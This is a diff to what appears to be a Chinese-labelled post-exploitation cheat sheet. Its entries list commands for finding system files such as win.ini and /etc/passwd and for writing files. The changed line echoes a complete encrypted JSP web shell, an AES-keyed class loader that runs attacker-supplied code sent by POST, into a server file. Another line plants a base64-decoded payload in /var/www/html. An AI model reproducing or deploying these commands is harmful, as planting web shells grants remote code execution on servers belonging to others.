@@ -2,7 +2,7 @@ windows查找文件::::dir c:\ /s /b | find "win.ini"、dir c:\ /s /b | find "na
 
 linux查找文件::::find / -name passwd
 
-windows写文件::::echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^> >> C:/x/x.jsp、、echo ^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^> >> C:/x/x.jsp、、echo ^<%if (request.getMethod().equals("POST")){String k="af8a6a25cc5bfb73";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> >> C:/x/x.jsp
+windows写文件::::echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^> >> C:/x/x.jsp、、echo ^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^> >> C:/x/x.jsp、、echo ^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> >> C:/x/x.jsp
 
 linux写文件::::echo xxxxx== |base64 -d > /var/www/html/1.jsp
 
